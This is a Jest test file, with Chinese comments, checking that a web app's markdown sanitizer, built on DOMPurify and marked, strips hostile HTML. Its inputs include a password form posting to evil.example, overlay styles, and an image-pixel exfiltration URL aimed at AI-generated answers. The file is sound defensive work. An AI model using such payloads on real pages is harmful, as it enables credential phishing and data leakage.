const fs = require("fs");
const path = require("path");
const vm = require("vm");
const { JSDOM } = require("jsdom");

/**
 * mycr F-02 修正(docs/specs/spec_markdown_sanitization_hardening.md）：既有的
 * test/MarkdownSanitization.test.js 只做純文字掃描，從來沒有真的把字串丟進
 * DOMPurify 看它吐出什麼——這個檔案第一次真的執行正式環境會用到的那組函式庫，
 * 直接驗證 renderMarkdownSafe_ 的實際行為，而不是只檢查原始碼文字裡有沒有出現
 * 看起來對的設定。
 *
 * marked@18.0.12 這個 npm 套件本身現在是純 ESM（package.json 沒有 CJS
 * exports 條件），plain require("marked") 在 Jest 底下行不通；改成直接讀取
 * marked.umd.js／purify.min.js 這兩個實體檔案的原始碼——這正是 Index.html
 * 用 <script> 標籤載入、CDN 實際會送給訪客的同一份檔案——在 vm 沙箱裡執行，
 * 讓它們的 UMD wrapper 自己偵測沒有 module/exports/define，照瀏覽器的行為
 * 掛到沙箱的全域物件上（marked/DOMPurify），比透過 npm 套件的 ESM/exports
 * 解析更貼近正式環境實際載入的方式。
 *
 * 同一個沙箱裡再直接從 JavaScript.html 的原始碼文字抓出 renderMarkdownSafe_
 * 的原始碼並執行（技巧比照 test/EasyMdePreviewSanitization.test.js 的
 * extractFunctionBody），驗證的是正式程式碼本身，不是另外手動謄寫一份複製版本。
 */

const javaScriptHtml = fs.readFileSync(
  path.join(__dirname, "../src/JavaScript.html"),
  "utf8"
);
const markedUmdSource = fs.readFileSync(
  path.join(__dirname, "../node_modules/marked/lib/marked.umd.js"),
  "utf8"
);
const dompurifySource = fs.readFileSync(
  path.join(__dirname, "../node_modules/dompurify/dist/purify.min.js"),
  "utf8"
);

function extractDeclaration(varName) {
  const startMatch = javaScriptHtml.match(
    new RegExp("var\\s+" + varName + "\\s*=\\s*\\{")
  );
  if (!startMatch) return null;
  const braceStart = startMatch.index + startMatch[0].length - 1;
  let depth = 1;
  let i = braceStart + 1;
  while (depth > 0 && i < javaScriptHtml.length) {
    if (javaScriptHtml[i] === "{") depth++;
    else if (javaScriptHtml[i] === "}") depth--;
    i++;
  }
  return javaScriptHtml.slice(startMatch.index, i) + ";";
}

function extractFunction(fnName) {
  const startMatch = javaScriptHtml.match(
    new RegExp("function\\s+" + fnName + "\\s*\\([^)]*\\)\\s*\\{")
  );
  if (!startMatch) return null;
  let depth = 1;
  let i = startMatch.index + startMatch[0].length;
  while (depth > 0 && i < javaScriptHtml.length) {
    if (javaScriptHtml[i] === "{") depth++;
    else if (javaScriptHtml[i] === "}") depth--;
    i++;
  }
  return javaScriptHtml.slice(startMatch.index, i);
}

function buildSandbox() {
  const dom = new JSDOM("", { url: "https://example.com/" });
  const context = { window: dom.window };
  vm.createContext(context);
  vm.runInContext(markedUmdSource, context); // 掛上 context.marked
  vm.runInContext(dompurifySource, context); // 掛上 context.DOMPurify(綁在 context.window 上)
  const source = [
    extractDeclaration("MD_SANITIZE_CONFIG_"),
    extractDeclaration("MD_SANITIZE_CONFIG_AI_"),
    extractFunction("renderMarkdownSafe_")
  ]
    .filter(Boolean)
    .join("\n\n");
  vm.runInContext(source, context);
  return context;
}

describe("renderMarkdownSafe_ actually blocks known unsafe HTML (real dompurify/marked, pinned to production versions)", () => {
  let sandbox;

  beforeAll(() => {
    sandbox = buildSandbox();
  });

  test("MD_SANITIZE_CONFIG_ and renderMarkdownSafe_ are both present in JavaScript.html", () => {
    expect(sandbox.MD_SANITIZE_CONFIG_).toBeDefined();
    expect(typeof sandbox.renderMarkdownSafe_).toBe("function");
  });

  test("strips a password-collecting form", () => {
    const html = sandbox.renderMarkdownSafe_(
      '<form action="https://evil.example"><input type="password"><button>OK</button></form>'
    );
    expect(html).not.toMatch(/<form/i);
    expect(html).not.toMatch(/<input/i);
  });

  test("strips a page-wide <style> block", () => {
    const html = sandbox.renderMarkdownSafe_(
      "hi\n\n<style>.modal-overlay{display:block!important}</style>\n\nthere"
    );
    expect(html).not.toMatch(/<style/i);
  });

  test("strips a style attribute used to draw a fixed-position overlay", () => {
    const html = sandbox.renderMarkdownSafe_(
      '<div style="position:fixed;inset:0;z-index:99999;background:#fff">overlay</div>'
    );
    expect(html).not.toMatch(/style\s*=/i);
  });

  test("leaves normal markdown structure intact", () => {
    const html = sandbox.renderMarkdownSafe_(
      "# Title\n\n- item one\n- item two\n\n```js\nconst a = 1;\n```\n\n" +
        "[link](https://example.com) **bold**\n\n| a | b |\n|---|---|\n| 1 | 2 |"
    );
    expect(html).toMatch(/<h1>Title<\/h1>/);
    expect(html).toMatch(/<li>item one<\/li>/);
    expect(html).toMatch(/<pre><code/);
    expect(html).toMatch(/<a href="https:\/\/example\.com">link<\/a>/);
    expect(html).toMatch(/<strong>bold<\/strong>/);
    expect(html).toMatch(/<table>/);
  });

  test("standard profile allows a remote image (a legitimate feature for the owner's own notes)", () => {
    const html = sandbox.renderMarkdownSafe_("![alt text](https://example.com/pic.png)");
    expect(html).toMatch(/<img[^>]*src="https:\/\/example\.com\/pic\.png"/);
  });

  test("AI-answer profile additionally strips remote images, on top of everything the standard profile already blocks", () => {
    const html = sandbox.renderMarkdownSafe_(
      "![alt text](https://evil.example/pixel.gif?leak=abc)",
      sandbox.MD_SANITIZE_CONFIG_AI_
    );
    expect(html).not.toMatch(/<img/i);

    const formHtml = sandbox.renderMarkdownSafe_(
      '<form action="https://evil.example"><input type="password"></form>',
      sandbox.MD_SANITIZE_CONFIG_AI_
    );
    expect(formHtml).not.toMatch(/<form/i);
  });
});

describe("mycr F-02 fix: every known render site routes through renderMarkdownSafe_", () => {
  test("the article body (detail-content) site calls renderMarkdownSafe_, not DOMPurify.sanitize directly", () => {
    const javaScriptHtml = fs.readFileSync(
      path.join(__dirname, "../src/JavaScript.html"),
      "utf8"
    );
    const articleBodyMatch = javaScriptHtml.match(
      /getElementById\('detail-content'\)\.innerHTML\s*=\s*([^;]+);/
    );
    expect(articleBodyMatch).not.toBeNull();
    expect(articleBodyMatch[1]).toMatch(/renderMarkdownSafe_\(/);
  });

  test("the markdown attachment preview site calls renderMarkdownSafe_, not DOMPurify.sanitize directly", () => {
    const javaScriptHtml = fs.readFileSync(
      path.join(__dirname, "../src/JavaScript.html"),
      "utf8"
    );
    const previewSiteMatch = javaScriptHtml.match(/mdDiv\.innerHTML\s*=\s*([^;]+);/);
    expect(previewSiteMatch).not.toBeNull();
    expect(previewSiteMatch[1]).toMatch(/renderMarkdownSafe_\(/);
  });

  test("the EasyMDE editor's previewRender site calls renderMarkdownSafe_, not DOMPurify.sanitize directly", () => {
    const javaScriptHtml = fs.readFileSync(
      path.join(__dirname, "../src/JavaScript.html"),
      "utf8"
    );
    const previewRenderMatch = javaScriptHtml.match(
      /previewRender\s*:\s*function[^{]*\{([\s\S]*?)\n\s{6}\}/
    );
    expect(previewRenderMatch).not.toBeNull();
    expect(previewRenderMatch[1]).toMatch(/renderMarkdownSafe_\(/);
  });

  test("the AI answer site calls renderMarkdownSafe_ with the stricter AI profile, not DOMPurify.sanitize directly", () => {
    const javaScriptHtml = fs.readFileSync(
      path.join(__dirname, "../src/JavaScript.html"),
      "utf8"
    );
    const aiAnswerMatch = javaScriptHtml.match(/answerEl\.innerHTML\s*=\s*([^;]+);/);
    expect(aiAnswerMatch).not.toBeNull();
    expect(aiAnswerMatch[1]).toMatch(/renderMarkdownSafe_\(/);
    expect(aiAnswerMatch[1]).toMatch(/MD_SANITIZE_CONFIG_AI_/);
  });
});
